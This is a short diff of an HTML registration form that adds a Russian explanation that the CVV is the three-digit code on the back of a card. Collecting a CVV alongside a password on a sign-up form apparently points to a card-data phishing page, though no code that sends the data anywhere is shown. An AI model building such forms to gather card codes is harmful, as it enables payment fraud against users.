@@ -31,7 +31,7 @@
         <label for="text">Password</label>
         <input type="text" id="pass" name="email" required>
         <p></p>
-        <label for="cvv">cvv код</label>
+        <label for="cvv">cvv код(3-х значный код на обратной стороне карты)</label>
         <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">>
         <br>
         <button type="submit">Зарегистрироваться</button>
